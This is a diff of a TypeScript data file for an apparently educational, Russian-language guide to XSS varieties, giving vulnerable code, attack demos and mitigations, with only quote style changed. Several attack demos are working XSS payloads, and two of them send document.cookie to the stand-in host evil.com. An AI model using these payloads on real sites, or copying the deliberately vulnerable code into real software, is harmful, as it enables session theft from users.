@@ -3,10 +3,10 @@
 // ============================================================
 export const xssTypes = [
   {
-    id: "reflected",
-    title: "Отражённый XSS (Reflected XSS)",
+    id: 'reflected',
+    title: 'Отражённый XSS (Reflected XSS)',
     description:
-      "Отражённый XSS возникает, когда вредоносный скрипт встраивается в ответ сервера как результат запроса, содержащего внедрённый код. Скрипт «отражается» от сервера к пользователю через URL-параметры, формы или заголовки.",
+      'Отражённый XSS возникает, когда вредоносный скрипт встраивается в ответ сервера как результат запроса, содержащего внедрённый код. Скрипт «отражается» от сервера к пользователю через URL-параметры, формы или заголовки.',
     vulnerableCode: `<!-- УЯЗВИМЫЙ КОД -->
 <div>
   Результаты поиска для:
@@ -41,13 +41,13 @@ export const xssTypes = [
 </script>`,
     attackDemo: '<script>alert("XSS-атака выполнена!")</script>',
     mitigation:
-      "Используйте textContent вместо innerHTML, кодируйте спецсимволы, применяйте Content Security Policy (CSP).",
+      'Используйте textContent вместо innerHTML, кодируйте спецсимволы, применяйте Content Security Policy (CSP).',
   },
   {
-    id: "stored",
-    title: "Хранимый XSS (Stored XSS)",
+    id: 'stored',
+    title: 'Хранимый XSS (Stored XSS)',
     description:
-      "Хранимый XSS — наиболее опасный тип, при котором вредоносный скрипт сохраняется на сервере (в базе данных, логах, комментариях) и выполняется при каждом отображении страницы. В отличие от отражённого XSS, жертве не нужно переходить по специальной ссылке — достаточно просто открыть страницу.",
+      'Хранимый XSS — наиболее опасный тип, при котором вредоносный скрипт сохраняется на сервере (в базе данных, логах, комментариях) и выполняется при каждом отображении страницы. В отличие от отражённого XSS, жертве не нужно переходить по специальной ссылке — достаточно просто открыть страницу.',
     vulnerableCode: `<!-- УЯЗВИМЫЙ КОД —评论区 -->
 <div class="comments">
   <!-- Комментарии из базы данных -->
@@ -86,16 +86,15 @@ app.post('/api/comments', (req, res) => {
   });
   db.query('INSERT INTO comments (text) VALUES (?)', [cleanText]);
 });`,
-    attackDemo:
-      '<script>document.location="https://evil.com/steal?cookie="+document.cookie</script>',
+    attackDemo: '<script>document.location="https://evil.com/steal?cookie="+document.cookie</script>',
     mitigation:
-      "Санитизируйте ввод перед сохранением в БД. Используйте DOMPurify для очистки HTML. Применяйте CSP заголовки.",
+      'Санитизируйте ввод перед сохранением в БД. Используйте DOMPurify для очистки HTML. Применяйте CSP заголовки.',
   },
   {
-    id: "dom",
-    title: "DOM-based XSS",
+    id: 'dom',
+    title: 'DOM-based XSS',
     description:
-      "DOM-based XSS возникает, когда уязвимость находится в клиентском JavaScript-коде, который модифицирует DOM-дерево на основе данных из ненадёжного источника. В отличие от отражённого и хранимого XSS, вредоносный код вообще не отправляется на сервер — вся атака происходит в браузере.",
+      'DOM-based XSS возникает, когда уязвимость находится в клиентском JavaScript-коде, который модифицирует DOM-дерево на основе данных из ненадёжного источника. В отличие от отражённого и хранимого XSS, вредоносный код вообще не отправляется на сервер — вся атака происходит в браузере.',
     vulnerableCode: `// УЯЗВИМЫЙ КОД — на стороне клиента
 // Чтение данных из location.hash (фрагмента URL)
 const userInput = location.hash.substring(1);
@@ -135,15 +134,15 @@ document.getElementById('welcome').innerHTML =
 // Вариант 3: Использовать URI-кодирование
 const safeInput = decodeURIComponent(userInput);
 // Всегда валидируйте входные данные!`,
-    attackDemo: "#<img src=x onerror=\"document.body.style.background='red'\">",
+    attackDemo: '#<img src=x onerror="document.body.style.background=\'red\'">',
     mitigation:
-      "Используйте textContent, а не innerHTML. Кодируйте данные из location.hash, document.referrer и других клиентских источников.",
+      'Используйте textContent, а не innerHTML. Кодируйте данные из location.hash, document.referrer и других клиентских источников.',
   },
   {
-    id: "svg",
-    title: "SVG XSS",
+    id: 'svg',
+    title: 'SVG XSS',
     description:
-      "XSS через SVG-файлы — внедрение JavaScript в SVG-изображения. SVG поддерживает JavaScript, что позволяет злоумышленникам внедрять скрипты в «изображения», загружаемые на сайт.",
+      'XSS через SVG-файлы — внедрение JavaScript в SVG-изображения. SVG поддерживает JavaScript, что позволяет злоумышленникам внедрять скрипты в «изображения», загружаемые на сайт.',
     vulnerableCode: `<!-- УЯЗВИМЫЙ КОД — загрузка SVG без проверки -->
 <img src="/uploads/user-avatar.svg" alt="Avatar">
 
@@ -181,16 +180,15 @@ app.post('/upload', async (req, res) => {
 <object data="safe.svg" type="image/svg+xml"
         sandbox="allow-same-origin">
 </object>`,
-    attackDemo:
-      '<svg onload="alert(document.cookie)"><circle cx="50" cy="50" r="40"/></svg>',
+    attackDemo: '<svg onload="alert(document.cookie)"><circle cx="50" cy="50" r="40"/></svg>',
     mitigation:
-      "Конвертируйте SVG в PNG на сервере. Используйте CSP для блокировки inline-скриптов. Санитизируйте SVG через DOMPurify с удалением <script> и обработчиков событий.",
+      'Конвертируйте SVG в PNG на сервере. Используйте CSP для блокировки inline-скриптов. Санитизируйте SVG через DOMPurify с удалением <script> и обработчиков событий.',
   },
   {
-    id: "markdown",
-    title: "Markdown XSS",
+    id: 'markdown',
+    title: 'Markdown XSS',
     description:
-      "XSS через Markdown-рендеринг — многие парсеры Markdown позволяют HTML-разметку внутри текста, что может быть использовано для внедрения скриптов.",
+      'XSS через Markdown-рендеринг — многие парсеры Markdown позволяют HTML-разметку внутри текста, что может быть использовано для внедрения скриптов.',
     vulnerableCode: `<!-- УЯЗВИМЫЙ КОД — Markdown с HTML -->
 <!-- Пользовательский ввод: -->
 <!-- [Click here](javascript:alert('XSS')) -->
@@ -225,16 +223,15 @@ function Comment({ text }) {
 
 <!-- Или отключить HTML в markdown-it: -->
 const md = require('markdown-it')({ html: false });`,
-    attackDemo:
-      '[Click here](javascript:alert(document.cookie))\n\n<img src=x onerror=alert("XSS")>',
+    attackDemo: '[Click here](javascript:alert(document.cookie))\n\n<img src=x onerror=alert("XSS")>',
     mitigation:
-      "Отключите HTML в Markdown-парсере (html: false). Используйте DOMPurify для санитизации результата. Запретите javascript: URL-схемы.",
+      'Отключите HTML в Markdown-парсере (html: false). Используйте DOMPurify для санитизации результата. Запретите javascript: URL-схемы.',
   },
   {
-    id: "pdf",
-    title: "PDF XSS",
+    id: 'pdf',
+    title: 'PDF XSS',
     description:
-      "XSS через PDF-файлы — встроенный PDF-просмотрщик браузера может выполнять JavaScript из PDF-документов через Embedded Files и JavaScript API PDF.",
+      'XSS через PDF-файлы — встроенный PDF-просмотрщик браузера может выполнять JavaScript из PDF-документов через Embedded Files и JavaScript API PDF.',
     vulnerableCode: `<!-- УЯЗВИМЫЙ КОД -- PDF с JavaScript -->
 <!-- PDF может содержать: -->
 <!-- this.disclosedDoc = true; -->
@@ -270,16 +267,15 @@ app.post('/upload-pdf', async (req, res) => {
 <!-- Или конвертировать в изображения: -->
 <!-- Использовать pdf2pic или similar -->
 <embed src="/uploads/report.pdf#toolbar=0&navpanes=0" type="application/pdf">`,
-    attackDemo:
-      'PDF с встроенным JavaScript: this.disclosedDoc = true; app.alert("XSS");',
+    attackDemo: 'PDF с встроенным JavaScript: this.disclosedDoc = true; app.alert("XSS");',
     mitigation:
-      "Удаляйте JavaScript из PDF на сервере (pdf-lib). Конвертируйте PDF в изображения. Используйте песочницу для просмотра. Устанавливайте Content-Disposition: attachment.",
+      'Удаляйте JavaScript из PDF на сервере (pdf-lib). Конвертируйте PDF в изображения. Используйте песочницу для просмотра. Устанавливайте Content-Disposition: attachment.',
   },
   {
-    id: "angular",
-    title: "Angular/XSS через bypass санитизации",
+    id: 'angular',
+    title: 'Angular/XSS через bypass санитизации',
     description:
-      "Angular автоматически экранирует XSS в шаблонах, но существуют обходные пути через bypassSecurityTrustHtml, небезопасные пайпы и DOM APIs.",
+      'Angular автоматически экранирует XSS в шаблонах, но существуют обходные пути через bypassSecurityTrustHtml, небезопасные пайпы и DOM APIs.',
     vulnerableCode: `// УЯЗВИМЫЙ КОД — Angular компонент
 @Component({
   template: \`
@@ -327,16 +323,15 @@ export class SanitizeHtmlPipe implements PipeTransform {
     return this.sanitizer.bypassSecurityTrustHtml(cleaned);
   }
 }`,
-    attackDemo:
-      "<img src=x onerror=\"document.location='https://evil.com/steal?c='+document.cookie\">",
+    attackDemo: '<img src=x onerror="document.location=\'https://evil.com/steal?c=\'+document.cookie">',
     mitigation:
-      "Не используйте bypassSecurityTrustHtml с пользовательским вводом. Используйте DOMPurify для санитизации. Применяйте {{}} вместо [innerHTML] когда возможно.",
+      'Не используйте bypassSecurityTrustHtml с пользовательским вводом. Используйте DOMPurify для санитизации. Применяйте {{}} вместо [innerHTML] когда возможно.',
   },
   {
-    id: "template-literal",
-    title: "XSS через Template Literals и String Interpolation",
+    id: 'template-literal',
+    title: 'XSS через Template Literals и String Interpolation',
     description:
-      "JavaScript template literals (`${expr}`) могут выполнять XSS, если используются для генерации HTML с пользовательским вводом.",
+      'JavaScript template literals (`${expr}`) могут выполнять XSS, если используются для генерации HTML с пользовательским вводом.',
     vulnerableCode: `// УЯЗВИМЫЙ КОД
 function renderUserProfile(user) {
   // Template literal + innerHTML = XSS
@@ -386,13 +381,13 @@ const ejs = require('ejs');
 ejs.render(template, data, { escape: true });`,
     attackDemo: 'user.name = "<img src=x onerror=alert(document.cookie)>"',
     mitigation:
-      "Всегда экранируйте переменные в template literals перед вставкой в HTML. Используйте автоматическое экранирование в шаблонизаторах (EJS, Nunjucks autoescape).",
+      'Всегда экранируйте переменные в template literals перед вставкой в HTML. Используйте автоматическое экранирование в шаблонизаторах (EJS, Nunjucks autoescape).',
   },
   {
-    id: "web-storage",
-    title: "XSS через localStorage/sessionStorage",
+    id: 'web-storage',
+    title: 'XSS через localStorage/sessionStorage',
     description:
-      "Данные из localStorage/sessionStorage не санитизируются автоматически. Если вредоносный скрипт сохранит XSS payload в storage, а другой компонент отобразит его через innerHTML — произойдёт атака.",
+      'Данные из localStorage/sessionStorage не санитизируются автоматически. Если вредоносный скрипт сохранит XSS payload в storage, а другой компонент отобразит его через innerHTML — произойдёт атака.',
     vulnerableCode: `// УЯЗВИМЫЙ КОД
 // Страница A — сохраняет данные
 localStorage.setItem('userPrefs', JSON.stringify({
@@ -436,9 +431,8 @@ function isValidURL(str) {
   } catch (e) {
     if (process.env.NODE_ENV === "development") console.warn("[xss-data.ts] isValidURL failed:", e);
 }`,
-    attackDemo:
-      "localStorage.setItem('lastRedirect', 'javascript:alert(document.cookie)');",
+    attackDemo: "localStorage.setItem('lastRedirect', 'javascript:alert(document.cookie)');",
     mitigation:
-      "Никогда не вставляйте данные из localStorage через innerHTML без санитизации. Используйте textContent или createElement с установкой свойств.",
+      'Никогда не вставляйте данные из localStorage через innerHTML без санитизации. Используйте textContent или createElement с установкой свойств.',
   },
 ];
